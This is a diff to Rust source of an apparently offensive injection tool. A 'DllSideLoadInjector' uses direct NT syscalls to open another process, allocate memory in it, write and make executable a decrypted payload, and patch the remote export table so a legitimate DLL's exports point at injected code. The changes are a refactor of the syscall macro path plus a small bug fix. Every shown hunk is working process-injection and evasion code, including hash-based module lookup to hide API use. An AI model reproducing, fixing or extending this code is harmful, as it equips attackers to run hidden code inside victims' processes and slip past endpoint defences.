@@ -254,7 +254,7 @@ impl crate::injection::Injector for DllSideLoadInjector {
             | PROCESS_CREATE_THREAD
             | PROCESS_QUERY_INFORMATION) as u64;
         let open_status = unsafe {
-            syscall!(
+            crate::syscall!(
                 "NtOpenProcess",
                 &mut h_proc as *mut _ as u64,
                 access_mask,
@@ -270,7 +270,7 @@ impl crate::injection::Injector for DllSideLoadInjector {
 
         macro_rules! close_h {
             ($h:expr) => {
-                syscall!("NtClose", $h as u64).ok();
+                crate::syscall!("NtClose", $h as u64).ok();
             };
         }
         macro_rules! cleanup_and_err {
@@ -319,7 +319,7 @@ impl crate::injection::Injector for DllSideLoadInjector {
         // ── 6. Allocate RW- memory in the target process ──────────────────
         let mut remote_payload: *mut std::ffi::c_void = std::ptr::null_mut();
         let mut alloc_size = plaintext.len();
-        let s = syscall!(
+        let s = crate::syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut remote_payload as *mut _ as u64,
@@ -342,7 +342,7 @@ impl crate::injection::Injector for DllSideLoadInjector {
 
         // ── 7. Write the decrypted payload ────────────────────────────────
         let mut written = 0usize;
-        let write_ok = match syscall!(
+        let write_ok = match crate::syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             remote_payload as u64,
@@ -356,7 +356,7 @@ impl crate::injection::Injector for DllSideLoadInjector {
         if !write_ok {
             let mut free_base = remote_payload as usize;
             let mut free_size = 0usize;
-            syscall!(
+            crate::syscall!(
                 "NtFreeVirtualMemory",
                 h_proc as u64,
                 &mut free_base as *mut _ as u64,
@@ -371,7 +371,7 @@ impl crate::injection::Injector for DllSideLoadInjector {
         let mut old_protect = 0u32;
         let mut prot_base = remote_payload as usize;
         let mut prot_size = plaintext.len();
-        let protect_ok = match syscall!(
+        let protect_ok = match crate::syscall!(
             "NtProtectVirtualMemory",
             h_proc as u64,
             &mut prot_base as *mut _ as u64,
@@ -385,7 +385,7 @@ impl crate::injection::Injector for DllSideLoadInjector {
         if !protect_ok {
             let mut free_base = remote_payload as usize;
             let mut free_size = 0usize;
-            syscall!(
+            crate::syscall!(
                 "NtFreeVirtualMemory",
                 h_proc as u64,
                 &mut free_base as *mut _ as u64,
@@ -397,7 +397,7 @@ impl crate::injection::Injector for DllSideLoadInjector {
         }
 
         // ── 9. Flush instruction cache ────────────────────────────────────
-        syscall!(
+        crate::syscall!(
             "NtFlushInstructionCache",
             h_proc as u64,
             remote_payload as u64,
@@ -425,7 +425,7 @@ impl crate::injection::Injector for DllSideLoadInjector {
         if status < 0 || h_thread.is_null() {
             let mut free_base = remote_payload as usize;
             let mut free_size = 0usize;
-            syscall!(
+            crate::syscall!(
                 "NtFreeVirtualMemory",
                 h_proc as u64,
                 &mut free_base as *mut _ as u64,
@@ -505,7 +505,7 @@ impl DllSideLoadInjector {
             | PROCESS_CREATE_THREAD
             | PROCESS_QUERY_INFORMATION) as u64;
         let open_status = unsafe {
-            syscall!(
+            crate::syscall!(
                 "NtOpenProcess",
                 &mut h_proc as *mut _ as u64,
                 access_mask,
@@ -521,7 +521,7 @@ impl DllSideLoadInjector {
 
         macro_rules! close_h {
             ($h:expr) => {
-                syscall!("NtClose", $h as u64).ok();
+                crate::syscall!("NtClose", $h as u64).ok();
             };
         }
         macro_rules! cleanup_and_err {
@@ -537,17 +537,19 @@ impl DllSideLoadInjector {
         // its name and walking the PEB's loaded-module list.  This gives us
         // the base address of the real DLL in the target process.
         let forward_target_bytes = format!("{}\0", export_config.forward_target);
-        let forward_base = unsafe {
+        let forward_base = match unsafe {
             pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(
                 forward_target_bytes.as_bytes(),
             ))
-        }
-        .ok_or_else(|| {
-            cleanup_and_err!(format!(
-                "InjectSideLoad: forward target '{}' not found in PEB",
-                export_config.forward_target
-            ))
-        })?;
+        } {
+            Some(base) => base,
+            None => {
+                cleanup_and_err!(format!(
+                    "InjectSideLoad: forward target '{}' not found in PEB",
+                    export_config.forward_target
+                ));
+            }
+        };
 
         // ── 4. Resolve real export addresses from the forward target ──────
         //
@@ -605,7 +607,7 @@ impl DllSideLoadInjector {
         let mut remote_payload: *mut std::ffi::c_void =
             (forward_base + 0x10000) as *mut std::ffi::c_void; // hint address
         let mut alloc_size = plaintext.len();
-        let s = syscall!(
+        let s = crate::syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut remote_payload as *mut _ as u64,
@@ -628,7 +630,7 @@ impl DllSideLoadInjector {
 
         // ── 6. Write the decrypted payload ────────────────────────────────
         let mut written = 0usize;
-        let write_ok = match syscall!(
+        let write_ok = match crate::syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             remote_payload as u64,
@@ -642,7 +644,7 @@ impl DllSideLoadInjector {
         if !write_ok {
             let mut free_base = remote_payload as usize;
             let mut free_size = 0usize;
-            syscall!(
+            crate::syscall!(
                 "NtFreeVirtualMemory",
                 h_proc as u64,
                 &mut free_base as *mut _ as u64,
@@ -680,7 +682,7 @@ impl DllSideLoadInjector {
         let mut old_protect = 0u32;
         let mut prot_base = remote_payload as usize;
         let mut prot_size = plaintext.len();
-        let protect_ok = match syscall!(
+        let protect_ok = match crate::syscall!(
             "NtProtectVirtualMemory",
             h_proc as u64,
             &mut prot_base as *mut _ as u64,
@@ -694,7 +696,7 @@ impl DllSideLoadInjector {
         if !protect_ok {
             let mut free_base = remote_payload as usize;
             let mut free_size = 0usize;
-            syscall!(
+            crate::syscall!(
                 "NtFreeVirtualMemory",
                 h_proc as u64,
                 &mut free_base as *mut _ as u64,
@@ -706,7 +708,7 @@ impl DllSideLoadInjector {
         }
 
         // ── 9. Flush instruction cache ────────────────────────────────────
-        syscall!(
+        crate::syscall!(
             "NtFlushInstructionCache",
             h_proc as u64,
             remote_payload as u64,
@@ -770,7 +772,7 @@ impl DllSideLoadInjector {
         if status < 0 || h_thread.is_null() {
             let mut free_base = remote_payload as usize;
             let mut free_size = 0usize;
-            syscall!(
+            crate::syscall!(
                 "NtFreeVirtualMemory",
                 h_proc as u64,
                 &mut free_base as *mut _ as u64,
@@ -859,7 +861,7 @@ unsafe fn patch_export_table(
     // Read the export directory from the remote process.
     let mut export_dir_buf = vec![0u8; export_dir_size];
     let mut bytes_read = 0usize;
-    let read_ok = match syscall!(
+    let read_ok = match crate::syscall!(
         "NtReadVirtualMemory",
         h_proc as u64,
         (remote_base + export_dir_rva) as u64,
@@ -942,7 +944,7 @@ unsafe fn patch_export_table(
         let name_rva_remote = remote_base + name_rva_offset;
         let mut name_rva_buf = [0u8; 4];
         let mut br = 0usize;
-        let ok = match syscall!(
+        let ok = match crate::syscall!(
             "NtReadVirtualMemory",
             h_proc as u64,
             name_rva_remote as u64,
@@ -956,7 +958,7 @@ unsafe fn patch_export_table(
         if !ok {
             continue;
         }
-        let export_name_rva = u32::from_le_bytes(name_rva) as usize;
+        let export_name_rva = u32::from_le_bytes(name_rva_buf) as usize;
         if export_name_rva == 0 {
             continue;
         }
@@ -965,7 +967,7 @@ unsafe fn patch_export_table(
         let export_name_remote = remote_base + export_name_rva;
         let mut name_buf = [0u8; 256];
         let mut br = 0usize;
-        let ok = match syscall!(
+        let ok = match crate::syscall!(
             "NtReadVirtualMemory",
             h_proc as u64,
             export_name_remote as u64,
@@ -990,7 +992,7 @@ unsafe fn patch_export_table(
             let ordinal_offset = addr_of_ordinals_rva + i * 2;
             let mut ordinal_buf = [0u8; 2];
             let mut br2 = 0usize;
-            let ok = match syscall!(
+            let ok = match crate::syscall!(
                 "NtReadVirtualMemory",
                 h_proc as u64,
                 (remote_base + ordinal_offset) as u64,
@@ -1011,7 +1013,7 @@ unsafe fn patch_export_table(
             let func_rva_slot = remote_base + addr_of_functions_rva + ordinal * 4;
             let new_rva_bytes = (forward_addr - remote_base).to_le_bytes();
             let mut bw = 0usize;
-            match syscall!(
+            match crate::syscall!(
                 "NtWriteVirtualMemory",
                 h_proc as u64,
                 func_rva_slot as u64,
